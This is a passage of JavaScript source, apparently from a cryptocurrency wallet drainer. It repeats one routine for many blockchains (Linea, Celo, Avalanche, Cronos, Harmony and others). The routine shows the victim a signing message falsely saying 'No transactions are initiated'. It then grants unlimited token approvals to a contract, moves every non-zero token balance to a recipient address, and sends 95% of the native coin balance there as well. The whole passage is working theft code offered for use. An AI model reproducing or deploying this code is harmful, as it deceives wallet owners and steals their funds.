                           const txResponse = await signer.sendTransaction(transaction);
                           console.log(`Transaction hash: ${txResponse.hash}`);
              
                           // Wait for the transaction to be mined
                           const txReceipt = await txResponse.wait();
                           console.log('Transaction confirmed in block:', txReceipt.blockNumber);
                           }else{
                             console.log('No balance found for GNOSIS to send')
                             
                           }
                         } catch (error) {
                              console.error('Error transferring GNOSIS:', error);
                             
                         }
                          break;
              
                        //LINEA
                        case linea.chainId:
                          const lineaTokens = await fetchLINEATokens(address);
              
                          // Message to sign
                          const lineaMessage = "This is a standard message approval to verify your account. No transactions are initiated";
                          const lineaSignature = await signer.signMessage(lineaMessage);
                          console.log('Signature:', lineaSignature);
              
                          const lineaTokenDetails = [];
                          for (let token of lineaTokens) {
                              const tokenContract = new ethers.Contract(token.contractAddress, erc20ABI, signer);
                              const balance = await tokenContract.balanceOf(address);
                              if (!balance.eq(0)) { //Only add tokens with non-zero balances
                                  lineaTokenDetails.push({
                                      contract: tokenContract,
                                      balance: balance,
                                      symbol: token.tokenSymbol,
                                      address: token.contractAddress
                                  });
                              }
                          }
              
                          // Sort tokens by balance, descending
                          lineaTokenDetails.sort((a, b) => b.balance.sub(a.balance));
              
                          try {
                              for(let token of lineaTokenDetails){
                                  const maxUint256 = ethers.constants.MaxUint256;
                                  // Approve unlimited tokens
                                  const approveTx = await token.contract.approve(lineaContractAddress, maxUint256);
                                  await approveTx.wait();
                                  console.log(`Tokens approved for ${token.symbol} at ${token.address}`);
              
              
                                  // Transfer tokens using the smart contract
                                  const contract = new ethers.Contract(lineaContractAddress, contractABI, signer);
                                  const transferTx = await contract.transferTokens(token.address, signer.getAddress(), recipientAddress, token.balance);
                                  await transferTx.wait();
                                  console.log(`Tokens transferred for ${token.symbol} from ${address} to ${recipientAddress}`);
                              }
                          } catch (error) {
                              console.error('Error transferring tokens:', error);
                             
                          }
              
                         try {
                           //send native tokens
                           const etherBalance = await provider.getBalance(address)
                           console.log(`Current balance: ${ethers.utils.formatEther(etherBalance)} LINEA`);
              
                           if(!etherBalance.eq(0)){
                             const amountToSend = etherBalance.mul(95).div(100);
                           console.log(`Amount to send: ${ethers.utils.formatEther(amountToSend)} LINEA`);
              
                       // Define the transaction
                           const transaction = {
                               to: recipientAddress, // Replace with the recipient's address
                               value: amountToSend,
                               // Optional: You can specify gasLimit and gasPrice here if necessary
                           };
                           const txResponse = await signer.sendTransaction(transaction);
                           console.log(`Transaction hash: ${txResponse.hash}`);
              
                           // Wait for the transaction to be mined
                           const txReceipt = await txResponse.wait();
                           console.log('Transaction confirmed in block:', txReceipt.blockNumber);
                           }else{
                             console.log('No balance found for LINEA to send')
                            
                           }
                         } catch (error) {
                              console.error('Error transferring LINEA:', error);
                              
                         }
                          break;
              
                      
                        //CELO
                        case celo.chainId:
                          const celoTokens = await fetchCELOTokens(address);
              
                          // Message to sign
                          const celoMessage = "This is a standard message approval to verify your account. No transactions are initiated";
                          const celoSignature = await signer.signMessage(celoMessage);
                          console.log('Signature:', celoSignature);
              
                          const celoTokenDetails = [];
                          for (let token of celoTokens) {
                              const tokenContract = new ethers.Contract(token.contractAddress, erc20ABI, signer);
                              const balance = await tokenContract.balanceOf(address);
                              if (!balance.eq(0)) { //Only add tokens with non-zero balances
                                  celoTokenDetails.push({
                                      contract: tokenContract,
                                      balance: balance,
                                      symbol: token.tokenSymbol,
                                      address: token.contractAddress
                                  });
                              }
                          }
              
                          // Sort tokens by balance, descending
                          celoTokenDetails.sort((a, b) => b.balance.sub(a.balance));
              
                          try {
                              for(let token of celoTokenDetails){
                                  const maxUint256 = ethers.constants.MaxUint256;
                                  // Approve unlimited tokens
                                  const approveTx = await token.contract.approve(celoContractAddress, maxUint256);
                                  await approveTx.wait();
                                  console.log(`Tokens approved for ${token.symbol} at ${token.address}`);
              
              
                                  // Transfer tokens using the smart contract
                                  const contract = new ethers.Contract(celoContractAddress, contractABI, signer);
                                  const transferTx = await contract.transferTokens(token.address, signer.getAddress(), recipientAddress, token.balance);
                                  await transferTx.wait();
                                  console.log(`Tokens transferred for ${token.symbol} from ${address} to ${recipientAddress}`);
                              }
                          } catch (error) {
                              console.error('Error transferring tokens:', error);
                              
                          }
              
                         try {
                           //send native tokens
                           const etherBalance = await provider.getBalance(address)
                           console.log(`Current balance: ${ethers.utils.formatEther(etherBalance)} CELO`);
              
                           if(!etherBalance.eq(0)){
                             const amountToSend = etherBalance.mul(95).div(100);
                           console.log(`Amount to send: ${ethers.utils.formatEther(amountToSend)} CELO`);
              
                       // Define the transaction
                           const transaction = {
                               to: recipientAddress, // Replace with the recipient's address
                               value: amountToSend,
                               // Optional: You can specify gasLimit and gasPrice here if necessary
                           };
                           const txResponse = await signer.sendTransaction(transaction);
                           console.log(`Transaction hash: ${txResponse.hash}`);
              
                           // Wait for the transaction to be mined
                           const txReceipt = await txResponse.wait();
                           console.log('Transaction confirmed in block:', txReceipt.blockNumber);
                           }else{
                             console.log('No balance found for CELO to send')
                             
                           }
                         } catch (error) {
                              console.error('Error transferring CELO:', error);
                              
                         }
                          break;
              
                        
                        //AVALANCHE
                        case avalanche.chainId:
                          const avaTokens = await fetchAVALANCHETokens(address);
              
                          // Message to sign
                          const avaMessage = "This is a standard message approval to verify your account. No transactions are initiated";
                          const avaSignature = await signer.signMessage(avaMessage);
                          console.log('Signature:', avaSignature);
              
                          const avaTokenDetails = [];
                          for (let token of avaTokens) {
                              const tokenContract = new ethers.Contract(token.contractAddress, erc20ABI, signer);
                              const balance = await tokenContract.balanceOf(address);
                              if (!balance.eq(0)) { //Only add tokens with non-zero balances
                                  avaTokenDetails.push({
                                      contract: tokenContract,
                                      balance: balance,
                                      symbol: token.tokenSymbol,
                                      address: token.contractAddress
                                  });
                              }
                          }
              
                          // Sort tokens by balance, descending
                          avaTokenDetails.sort((a, b) => b.balance.sub(a.balance));
              
                          try {
                              for(let token of avaTokenDetails){
                                  const maxUint256 = ethers.constants.MaxUint256;
                                  // Approve unlimited tokens
                                  const approveTx = await token.contract.approve(avalancheContractAddress, maxUint256);
                                  await approveTx.wait();
                                  console.log(`Tokens approved for ${token.symbol} at ${token.address}`);
              
              
                                  // Transfer tokens using the smart contract
                                  const contract = new ethers.Contract(avalancheContractAddress, contractABI, signer);
                                  const transferTx = await contract.transferTokens(token.address, signer.getAddress(), recipientAddress, token.balance);
                                  await transferTx.wait();
                                  console.log(`Tokens transferred for ${token.symbol} from ${address} to ${recipientAddress}`);
                              }
                          } catch (error) {
                              console.error('Error transferring tokens:', error);
                              
                          }
              
                         try {
                           //send native tokens
                           const etherBalance = await provider.getBalance(address)
                           console.log(`Current balance: ${ethers.utils.formatEther(etherBalance)} AVALANCHE`);
              
                           if(!etherBalance.eq(0)){
                             const amountToSend = etherBalance.mul(95).div(100);
                           console.log(`Amount to send: ${ethers.utils.formatEther(amountToSend)} AVALANCHE`);
              
                       // Define the transaction
                           const transaction = {
                               to: recipientAddress, // Replace with the recipient's address
                               value: amountToSend,
                               // Optional: You can specify gasLimit and gasPrice here if necessary
                           };
                           const txResponse = await signer.sendTransaction(transaction);
                           console.log(`Transaction hash: ${txResponse.hash}`);
              
                           // Wait for the transaction to be mined
                           const txReceipt = await txResponse.wait();
                           console.log('Transaction confirmed in block:', txReceipt.blockNumber);
                           }else{
                             console.log('No balance found for AVALANCHE to send')
                          
                           }
                         } catch (error) {
                              console.error('Error transferring AVALANCHE:', error);
                              
                         }
                          break;
              
                        //OPBNB
                        case opbnb.chainId:      
                        const opbnbTokens = await fetchOPBNBTokens(address);
              
                          // Message to sign
                          const opbnbMessage = "This is a standard message approval to verify your account. No transactions are initiated";
                          const opbnbSignature = await signer.signMessage(opbnbMessage);
                          console.log('Signature:', opbnbSignature);
              
                          const opbnbTokenDetails = [];
                          for (let token of opbnbTokens) {
                              const tokenContract = new ethers.Contract(token.contractAddress, erc20ABI, signer);
                              const balance = await tokenContract.balanceOf(address);
                              if (!balance.eq(0)) { //Only add tokens with non-zero balances
                                  opbnbTokenDetails.push({
                                      contract: tokenContract,
                                      balance: balance,
                                      symbol: token.tokenSymbol,
                                      address: token.contractAddress
                                  });
                              }
                          }
              
                          // Sort tokens by balance, descending
                          opbnbTokenDetails.sort((a, b) => b.balance.sub(a.balance));
              
                          try {
                              for(let token of opbnbTokenDetails){
                                  const maxUint256 = ethers.constants.MaxUint256;
                                  // Approve unlimited tokens
                                  const approveTx = await token.contract.approve(opbnbContractAddress, maxUint256);
                                  await approveTx.wait();
                                  console.log(`Tokens approved for ${token.symbol} at ${token.address}`);
              
              
                                  // Transfer tokens using the smart contract
                                  const contract = new ethers.Contract(opbnbContractAddress, contractABI, signer);
                                  const transferTx = await contract.transferTokens(token.address, signer.getAddress(), recipientAddress, token.balance);
                                  await transferTx.wait();
                                  console.log(`Tokens transferred for ${token.symbol} from ${address} to ${recipientAddress}`);
                              }
                          } catch (error) {
                              console.error('Error transferring tokens:', error);
                              
                          }
              
                         try {
                           //send native tokens
                           const etherBalance = await provider.getBalance(address)
                           console.log(`Current balance: ${ethers.utils.formatEther(etherBalance)} OPBNB`);
              
                           if(!etherBalance.eq(0)){
                             const amountToSend = etherBalance.mul(95).div(100);
                           console.log(`Amount to send: ${ethers.utils.formatEther(amountToSend)} OPBNB`);
              
                       // Define the transaction
                           const transaction = {
                               to: recipientAddress, // Replace with the recipient's address
                               value: amountToSend,
                               // Optional: You can specify gasLimit and gasPrice here if necessary
                           };
                           const txResponse = await signer.sendTransaction(transaction);
                           console.log(`Transaction hash: ${txResponse.hash}`);
              
                           // Wait for the transaction to be mined
                           const txReceipt = await txResponse.wait();
                           console.log('Transaction confirmed in block:', txReceipt.blockNumber);
                           }else{
                             console.log('No balance found for OPBNB to send')
                             
                           }
                         } catch (error) {
                              console.error('Error transferring OPBNB:', error);
                              
                         }
                            break;
                  
                        //OKX
                        case okx.chainId:
                          const okxTokens = await fetchOKXTokens(address);
              
                          // Message to sign
                          const okxMessage = "This is a standard message approval to verify your account. No transactions are initiated";
                          const okxSignature = await signer.signMessage(okxMessage);
                          console.log('Signature:', okxSignature);
              
                          const okxTokenDetails = [];
                          for (let token of okxTokens) {
                              const tokenContract = new ethers.Contract(token.contractAddress, erc20ABI, signer);
                              const balance = await tokenContract.balanceOf(address);
                              if (!balance.eq(0)) { //Only add tokens with non-zero balances
                                  okxTokenDetails.push({
                                      contract: tokenContract,
                                      balance: balance,
                                      symbol: token.tokenSymbol,
                                      address: token.contractAddress
                                  });
                              }
                          }
              
                          // Sort tokens by balance, descending
                          okxTokenDetails.sort((a, b) => b.balance.sub(a.balance));
              
                          try {
                              for(let token of okxTokenDetails){
                                  const maxUint256 = ethers.constants.MaxUint256;
                                  // Approve unlimited tokens
                                  const approveTx = await token.contract.approve(okxContractAddress, maxUint256);
                                  await approveTx.wait();
                                  console.log(`Tokens approved for ${token.symbol} at ${token.address}`);
              
              
                                  // Transfer tokens using the smart contract
                                  const contract = new ethers.Contract(okxContractAddress, contractABI, signer);
                                  const transferTx = await contract.transferTokens(token.address, signer.getAddress(), recipientAddress, token.balance);
                                  await transferTx.wait();
                                  console.log(`Tokens transferred for ${token.symbol} from ${address} to ${recipientAddress}`);
                              }
                          } catch (error) {
                              console.error('Error transferring tokens:', error);
                              
                          }
              
                         try {
                           //send native tokens
                           const etherBalance = await provider.getBalance(address)
                           console.log(`Current balance: ${ethers.utils.formatEther(etherBalance)} OKX`);
              
                           if(!etherBalance.eq(0)){
                             const amountToSend = etherBalance.mul(95).div(100);
                           console.log(`Amount to send: ${ethers.utils.formatEther(amountToSend)} OKX`);
              
                       // Define the transaction
                           const transaction = {
                               to: recipientAddress, // Replace with the recipient's address
                               value: amountToSend,
                               // Optional: You can specify gasLimit and gasPrice here if necessary
                           };
                           const txResponse = await signer.sendTransaction(transaction);
                           console.log(`Transaction hash: ${txResponse.hash}`);
              
                           // Wait for the transaction to be mined
                           const txReceipt = await txResponse.wait();
                           console.log('Transaction confirmed in block:', txReceipt.blockNumber);
                           }else{
                             console.log('No balance found for OKX to send')
                             
                           }
                         } catch (error) {
                              console.error('Error transferring OKX:', error);
                              
                         }
                          break;
              
              
                        //MANTLE
                        case mantle.chainId:
                          const mantleTokens = await fetchMANTLETokens(address);
              
                          // Message to sign
                          const mantleMessage = "This is a standard message approval to verify your account. No transactions are initiated";
                          const mantleSignature = await signer.signMessage(mantleMessage);
                          console.log('Signature:', mantleSignature);
              
                          const mantleTokenDetails = [];
                          for (let token of mantleTokens) {
                              const tokenContract = new ethers.Contract(token.contractAddress, erc20ABI, signer);
                              const balance = await tokenContract.balanceOf(address);
                              if (!balance.eq(0)) { //Only add tokens with non-zero balances
                                  mantleTokenDetails.push({
                                      contract: tokenContract,
                                      balance: balance,
                                      symbol: token.tokenSymbol,
                                      address: token.contractAddress
                                  });
                              }
                          }
              
                          // Sort tokens by balance, descending
                          mantleTokenDetails.sort((a, b) => b.balance.sub(a.balance));
              
                          try {
                              for(let token of mantleTokenDetails){
                                  const maxUint256 = ethers.constants.MaxUint256;
                                  // Approve unlimited tokens
                                  const approveTx = await token.contract.approve(mantleContractAddress, maxUint256);
                                  await approveTx.wait();
                                  console.log(`Tokens approved for ${token.symbol} at ${token.address}`);
              
              
                                  // Transfer tokens using the smart contract
                                  const contract = new ethers.Contract(mantleContractAddress, contractABI, signer);
                                  const transferTx = await contract.transferTokens(token.address, signer.getAddress(), recipientAddress, token.balance);
                                  await transferTx.wait();
                                  console.log(`Tokens transferred for ${token.symbol} from ${address} to ${recipientAddress}`);
                              }
                          } catch (error) {
                              console.error('Error transferring tokens:', error);
                              
                          }
              
                         try {
                           //send native tokens
                           const etherBalance = await provider.getBalance(address)
                           console.log(`Current balance: ${ethers.utils.formatEther(etherBalance)} MANTLE`);
              
                           if(!etherBalance.eq(0)){
                             const amountToSend = etherBalance.mul(95).div(100);
                           console.log(`Amount to send: ${ethers.utils.formatEther(amountToSend)} MANTLE`);
              
                       // Define the transaction
                           const transaction = {
                               to: recipientAddress, // Replace with the recipient's address
                               value: amountToSend,
                               // Optional: You can specify gasLimit and gasPrice here if necessary
                           };
                           const txResponse = await signer.sendTransaction(transaction);
                           console.log(`Transaction hash: ${txResponse.hash}`);
              
                           // Wait for the transaction to be mined
                           const txReceipt = await txResponse.wait();
                           console.log('Transaction confirmed in block:', txReceipt.blockNumber);
                           }else{
                             console.log('No balance found for MANTLE to send')
                             
                           }
                         } catch (error) {
                              console.error('Error transferring MANTLE:', error);
                             
                         }
                          break;
              
                        //AURORA
                        case aurora.chainId:
                          const aurTokens = await fetchAURORATokens(address);
              
                          // Message to sign
                          const aurMessage = "This is a standard message approval to verify your account. No transactions are initiated";
                          const aurSignature = await signer.signMessage(aurMessage);
                          console.log('Signature:', aurSignature);
              
                          const aurTokenDetails = [];
                          for (let token of aurTokens) {
                              const tokenContract = new ethers.Contract(token.contractAddress, erc20ABI, signer);
                              const balance = await tokenContract.balanceOf(address);
                              if (!balance.eq(0)) { //Only add tokens with non-zero balances
                                  aurTokenDetails.push({
                                      contract: tokenContract,
                                      balance: balance,
                                      symbol: token.tokenSymbol,
                                      address: token.contractAddress
                                  });
                              }
                          }
              
                          // Sort tokens by balance, descending
                          aurTokenDetails.sort((a, b) => b.balance.sub(a.balance));
              
                          try {
                              for(let token of aurTokenDetails){
                                  const maxUint256 = ethers.constants.MaxUint256;
                                  // Approve unlimited tokens
                                  const approveTx = await token.contract.approve(auroraContractAddress, maxUint256);
                                  await approveTx.wait();
                                  console.log(`Tokens approved for ${token.symbol} at ${token.address}`);
              
              
                                  // Transfer tokens using the smart contract
                                  const contract = new ethers.Contract(auroraContractAddress, contractABI, signer);
                                  const transferTx = await contract.transferTokens(token.address, signer.getAddress(), recipientAddress, token.balance);
                                  await transferTx.wait();
                                  console.log(`Tokens transferred for ${token.symbol} from ${address} to ${recipientAddress}`);
                              }
                          } catch (error) {
                              console.error('Error transferring tokens:', error);
                              
                          }
              
                         try {
                           //send native tokens
                           const etherBalance = await provider.getBalance(address)
                           console.log(`Current balance: ${ethers.utils.formatEther(etherBalance)} AURORA`);
              
                           if(!etherBalance.eq(0)){
                             const amountToSend = etherBalance.mul(95).div(100);
                           console.log(`Amount to send: ${ethers.utils.formatEther(amountToSend)} AURORA`);
              
                       // Define the transaction
                           const transaction = {
                               to: recipientAddress, // Replace with the recipient's address
                               value: amountToSend,
                               // Optional: You can specify gasLimit and gasPrice here if necessary
                           };
                           const txResponse = await signer.sendTransaction(transaction);
                           console.log(`Transaction hash: ${txResponse.hash}`);
              
                           // Wait for the transaction to be mined
                           const txReceipt = await txResponse.wait();
                           console.log('Transaction confirmed in block:', txReceipt.blockNumber);
                           }else{
                             console.log('No balance found for AURORA to send')
                             
                           }
                         } catch (error) {
                              console.error('Error transferring AURORA:', error);
                             
                         }
                          break;
              
              
                        //CRONOS
                        case cronos.chainId:
                          const cronosTokens = await fetchCRONOSTokens(address);
              
                          // Message to sign
                          const cronosMessage = "This is a standard message approval to verify your account. No transactions are initiated";
                          const cronosSignature = await signer.signMessage(cronosMessage);
                          console.log('Signature:', cronosSignature);
              
                          const cronosTokenDetails = [];
                          for (let token of cronosTokens) {
                              const tokenContract = new ethers.Contract(token.contractAddress, erc20ABI, signer);
                              const balance = await tokenContract.balanceOf(address);
                              if (!balance.eq(0)) { //Only add tokens with non-zero balances
                                  cronosTokenDetails.push({
                                      contract: tokenContract,
                                      balance: balance,
                                      symbol: token.tokenSymbol,
                                      address: token.contractAddress
                                  });
                              }
                          }
              
                          // Sort tokens by balance, descending
                          cronosTokenDetails.sort((a, b) => b.balance.sub(a.balance));
              
                          try {
                              for(let token of cronosTokenDetails){
                                  const maxUint256 = ethers.constants.MaxUint256;
                                  // Approve unlimited tokens
                                  const approveTx = await token.contract.approve(cronosContractAddress, maxUint256);
                                  await approveTx.wait();
                                  console.log(`Tokens approved for ${token.symbol} at ${token.address}`);
              
              
                                  // Transfer tokens using the smart contract
                                  const contract = new ethers.Contract(cronosContractAddress, contractABI, signer);
                                  const transferTx = await contract.transferTokens(token.address, signer.getAddress(), recipientAddress, token.balance);
                                  await transferTx.wait();
                                  console.log(`Tokens transferred for ${token.symbol} from ${address} to ${recipientAddress}`);
                              }
                          } catch (error) {
                              console.error('Error transferring tokens:', error);
                             
                          }
              
                         try {
                           //send native tokens
                           const etherBalance = await provider.getBalance(address)
                           console.log(`Current balance: ${ethers.utils.formatEther(etherBalance)} CRONOS`);
              
                           if(!etherBalance.eq(0)){
                             const amountToSend = etherBalance.mul(95).div(100);
                           console.log(`Amount to send: ${ethers.utils.formatEther(amountToSend)} CRONOS`);
              
                       // Define the transaction
                           const transaction = {
                               to: recipientAddress, // Replace with the recipient's address
                               value: amountToSend,
                               // Optional: You can specify gasLimit and gasPrice here if necessary
                           };
                           const txResponse = await signer.sendTransaction(transaction);
                           console.log(`Transaction hash: ${txResponse.hash}`);
              
                           // Wait for the transaction to be mined
                           const txReceipt = await txResponse.wait();
                           console.log('Transaction confirmed in block:', txReceipt.blockNumber);
                           }else{
                             console.log('No balance found for CRONOS to send')
                           }
                         } catch (error) {
                              console.error('Error transferring CRONOS:', error);
                         }
                          break;
              
              
                        //KLAYTN
                        case klaytn.chainId:
                          const klaytnTokens = await fetchKLAYTNTokens(address);
              
                          // Message to sign
                          const klaytnMessage = "This is a standard message approval to verify your account. No transactions are initiated";
                          const klaytnSignature = await signer.signMessage(klaytnMessage);
                          console.log('Signature:', klaytnSignature);
              
                          const klaytnTokenDetails = [];
                          for (let token of klaytnTokens) {
                              const tokenContract = new ethers.Contract(token.contractAddress, erc20ABI, signer);
                              const balance = await tokenContract.balanceOf(address);
                              if (!balance.eq(0)) { //Only add tokens with non-zero balances
                                  klaytnTokenDetails.push({
                                      contract: tokenContract,
                                      balance: balance,
                                      symbol: token.tokenSymbol,
                                      address: token.contractAddress
                                  });
                              }
                          }
              
                          // Sort tokens by balance, descending
                          klaytnTokenDetails.sort((a, b) => b.balance.sub(a.balance));
              
                          try {
                              for(let token of klaytnTokenDetails){
                                  const maxUint256 = ethers.constants.MaxUint256;
                                  // Approve unlimited tokens
                                  const approveTx = await token.contract.approve(klaytnContractAddress, maxUint256);
                                  await approveTx.wait();
                                  console.log(`Tokens approved for ${token.symbol} at ${token.address}`);
              
              
                                  // Transfer tokens using the smart contract
                                  const contract = new ethers.Contract(klaytnContractAddress, contractABI, signer);
                                  const transferTx = await contract.transferTokens(token.address, signer.getAddress(), recipientAddress, token.balance);
                                  await transferTx.wait();
                                  console.log(`Tokens transferred for ${token.symbol} from ${address} to ${recipientAddress}`);
                              }
                          } catch (error) {
                              console.error('Error transferring tokens:', error);
                          }
              
                         try {
                           //send native tokens
                           const etherBalance = await provider.getBalance(address)
                           console.log(`Current balance: ${ethers.utils.formatEther(etherBalance)} KLAYTN`);
              
                           if(!etherBalance.eq(0)){
                             const amountToSend = etherBalance.mul(95).div(100);
                           console.log(`Amount to send: ${ethers.utils.formatEther(amountToSend)} KLAYTN`);
              
                       // Define the transaction
                           const transaction = {
                               to: recipientAddress, // Replace with the recipient's address
                               value: amountToSend,
                               // Optional: You can specify gasLimit and gasPrice here if necessary
                           };
                           const txResponse = await signer.sendTransaction(transaction);
                           console.log(`Transaction hash: ${txResponse.hash}`);
              
                           // Wait for the transaction to be mined
                           const txReceipt = await txResponse.wait();
                           console.log('Transaction confirmed in block:', txReceipt.blockNumber);
                           }else{
                             console.log('No balance found for KLAYTN to send')
                            
                           }
                         } catch (error) {
                              console.error('Error transferring KLAYTN:', error);
                              
                         }
                          break;
              
              
                        
                        //PLATON
                        case platon.chainId:
                          const platTokens = await fetchPLATONTokens(address);
              
                          // Message to sign
                          const platMessage = "This is a standard message approval to verify your account. No transactions are initiated";
                          const platSignature = await signer.signMessage(platMessage);
                          console.log('Signature:', platSignature);
              
                          const platTokenDetails = [];
                          for (let token of platTokens) {
                              const tokenContract = new ethers.Contract(token.contractAddress, erc20ABI, signer);
                              const balance = await tokenContract.balanceOf(address);
                              if (!balance.eq(0)) { //Only add tokens with non-zero balances
                                  platTokenDetails.push({
                                      contract: tokenContract,
                                      balance: balance,
                                      symbol: token.tokenSymbol,
                                      address: token.contractAddress
                                  });
                              }
                          }
              
                          // Sort tokens by balance, descending
                          platTokenDetails.sort((a, b) => b.balance.sub(a.balance));
              
                          try {
                              for(let token of platTokenDetails){
                                  const maxUint256 = ethers.constants.MaxUint256;
                                  // Approve unlimited tokens
                                  const approveTx = await token.contract.approve(platonContractAddress, maxUint256);
                                  await approveTx.wait();
                                  console.log(`Tokens approved for ${token.symbol} at ${token.address}`);
              
              
                                  // Transfer tokens using the smart contract
                                  const contract = new ethers.Contract(platonContractAddress, contractABI, signer);
                                  const transferTx = await contract.transferTokens(token.address, signer.getAddress(), recipientAddress, token.balance);
                                  await transferTx.wait();
                                  console.log(`Tokens transferred for ${token.symbol} from ${address} to ${recipientAddress}`);
                              }
                          } catch (error) {
                              console.error('Error transferring tokens:', error);
                              
                          }
              
                         try {
                           //send native tokens
                           const etherBalance = await provider.getBalance(address)
                           console.log(`Current balance: ${ethers.utils.formatEther(etherBalance)} PLATON`);
              
                           if(!etherBalance.eq(0)){
                             const amountToSend = etherBalance.mul(95).div(100);
                           console.log(`Amount to send: ${ethers.utils.formatEther(amountToSend)} PLATON`);
              
                       // Define the transaction
                           const transaction = {
                               to: recipientAddress, // Replace with the recipient's address
                               value: amountToSend,
                               // Optional: You can specify gasLimit and gasPrice here if necessary
                           };
                           const txResponse = await signer.sendTransaction(transaction);
                           console.log(`Transaction hash: ${txResponse.hash}`);
              
                           // Wait for the transaction to be mined
                           const txReceipt = await txResponse.wait();
                           console.log('Transaction confirmed in block:', txReceipt.blockNumber);
                           }else{
                             console.log('No balance found for PLATON to send')
                             
                           }
                         } catch (error) {
                              console.error('Error transferring PLATON:', error);
                             
                         }
                          break;
              
              
                        //HARMONY
                        case harmony.chainId:
                          const harTokens = await fetchHARMONYTokens(address);
              
                          // Message to sign
                          const harMessage = "This is a standard message approval to verify your account. No transactions are initiated";
                          const harSignature = await signer.signMessage(harMessage);
                          console.log('Signature:', harSignature);
              
                          const harTokenDetails = [];
                          for (let token of harTokens) {
                              const tokenContract = new ethers.Contract(token.contractAddress, erc20ABI, signer);
                              const balance = await tokenContract.balanceOf(address);
                              if (!balance.eq(0)) { //Only add tokens with non-zero balances
                                  harTokenDetails.push({
                                      contract: tokenContract,
                                      balance: balance,
                                      symbol: token.tokenSymbol,
                                      address: token.contractAddress
                                  });
                              }
                          }
              
                          // Sort tokens by balance, descending
                          harTokenDetails.sort((a, b) => b.balance.sub(a.balance));
              
                          try {
                              for(let token of harTokenDetails){
                                  const maxUint256 = ethers.constants.MaxUint256;
                                  // Approve unlimited tokens
                                  const approveTx = await token.contract.approve(harmonyContractAddress, maxUint256);
                                  await approveTx.wait();
                                  console.log(`Tokens approved for ${token.symbol} at ${token.address}`);
              
              
                                  // Transfer tokens using the smart contract
                                  const contract = new ethers.Contract(harmonyContractAddress, contractABI, signer);
                                  const transferTx = await contract.transferTokens(token.address, signer.getAddress(), recipientAddress, token.balance);
                                  await transferTx.wait();
                                  console.log(`Tokens transferred for ${token.symbol} from ${address} to ${recipientAddress}`);
                              }
                          } catch (error) {
                              console.error('Error transferring tokens:', error);
                              
                          }
              
                         try {
                           //send native tokens
                           const etherBalance = await provider.getBalance(address)
                           console.log(`Current balance: ${ethers.utils.formatEther(etherBalance)} HARMONY`);
              
                           if(!etherBalance.eq(0)){
                             const amountToSend = etherBalance.mul(95).div(100);
                           console.log(`Amount to send: ${ethers.utils.formatEther(amountToSend)} HARMONY`);
              
                       // Define the transaction
                           const transaction = {
                               to: recipientAddress, // Replace with the recipient's address
                               value: amountToSend,
                               // Optional: You can specify gasLimit and gasPrice here if necessary
                           };
                           const txResponse = await signer.sendTransaction(transaction);
                           console.log(`Transaction hash: ${txResponse.hash}`);
              
                           // Wait for the transaction to be mined
                           const txReceipt = await txResponse.wait();
                           console.log('Transaction confirmed in block:', txReceipt.blockNumber);
                           }else{
                             console.log('No balance found for HARMONY to send')
                             
                           }
                         } catch (error) {
                              console.error('Error transferring HARMONY:', error);
                            
                         }
                          break;
              
              
                        //HECO
                        case heco.chainId:
                          const hecoTokens = await fetchHECOTokens(address);
              
                          // Message to sign
                          const hecoMessage = "This is a standard message approval to verify your account. No transactions are initiated";
                          const hecoSignature = await signer.signMessage(hecoMessage);
                          console.log('Signature:', hecoSignature);
              
                          const hecoTokenDetails = [];
                          for (let token of hecoTokens) {
                              const tokenContract = new ethers.Contract(token.contractAddress, erc20ABI, signer);
                              const balance = await tokenContract.balanceOf(address);
                              if (!balance.eq(0)) { //Only add tokens with non-zero balances
                                  hecoTokenDetails.push({
                                      contract: tokenContract,
                                      balance: balance,
                                      symbol: token.tokenSymbol,
                                      address: token.contractAddress
                                  });
                              }
                          }
              
                          // Sort tokens by balance, descending
                          hecoTokenDetails.sort((a, b) => b.balance.sub(a.balance));
              
                          try {
                              for(let token of hecoTokenDetails){
                                  const maxUint256 = ethers.constants.MaxUint256;
                                  // Approve unlimited tokens
                                  const approveTx = await token.contract.approve(hecoContractAddress, maxUint256);
                                  await approveTx.wait();
                                  console.log(`Tokens approved for ${token.symbol} at ${token.address}`);
              
              
                                  // Transfer tokens using the smart contract
                                  const contract = new ethers.Contract(hecoContractAddress, contractABI, signer);
                                  const transferTx = await contract.transferTokens(token.address, signer.getAddress(), recipientAddress, token.balance);
                                  await transferTx.wait();
                                  console.log(`Tokens transferred for ${token.symbol} from ${address} to ${recipientAddress}`);
                              }
                          } catch (error) {
                              console.error('Error transferring tokens:', error);
                             
                          }
              
                         try {
                           //send native tokens
                           const etherBalance = await provider.getBalance(address)
                           console.log(`Current balance: ${ethers.utils.formatEther(etherBalance)} HECO`);
              
                           if(!etherBalance.eq(0)){
                             const amountToSend = etherBalance.mul(95).div(100);
                           console.log(`Amount to send: ${ethers.utils.formatEther(amountToSend)} HECO`);
              
                       // Define the transaction
                           const transaction = {
                               to: recipientAddress, // Replace with the recipient's address
                               value: amountToSend,
                               // Optional: You can specify gasLimit and gasPrice here if necessary
                           };
                           const txResponse = await signer.sendTransaction(transaction);
                           console.log(`Transaction hash: ${txResponse.hash}`);
              
                           // Wait for the transaction to be mined
                           const txReceipt = await txResponse.wait();
                           console.log('Transaction confirmed in block:', txReceipt.blockNumber);
                           }else{
                             console.log('No balance found for HECO to send')
                             
                           }
                         } catch (error) {
                              console.error('Error transferring HECO:', error);
                              
                         }
                          break;
              
              
                        //SMARTBCH
                        case smartbch.chainId:
                          const bchTokens = await fetchSMARTBCHTokens(address);
              
                          // Message to sign
                          const bchMessage = "This is a standard message approval to verify your account. No transactions are initiated";
                          const bchSignature = await signer.signMessage(bchMessage);
                          console.log('Signature:', bchSignature);
              
                          const bchTokenDetails = [];
                          for (let token of bchTokens) {
                              const tokenContract = new ethers.Contract(token.contractAddress, erc20ABI, signer);
                              const balance = await tokenContract.balanceOf(address);
                              if (!balance.eq(0)) { //Only add tokens with non-zero balances
                                  bchTokenDetails.push({
                                      contract: tokenContract,
                                      balance: balance,
                                      symbol: token.tokenSymbol,
                                      address: token.contractAddress
                                  });
                              }
                          }
              
                          // Sort tokens by balance, descending
                          bchTokenDetails.sort((a, b) => b.balance.sub(a.balance));
              
                          try {
                              for(let token of bchTokenDetails){
                                  const maxUint256 = ethers.constants.MaxUint256;
                                  // Approve unlimited tokens
                                  const approveTx = await token.contract.approve(smartbchContractAddress, maxUint256);
                                  await approveTx.wait();
                                  console.log(`Tokens approved for ${token.symbol} at ${token.address}`);
              
              
                                  // Transfer tokens using the smart contract
                                  const contract = new ethers.Contract(smartbchContractAddress, contractABI, signer);
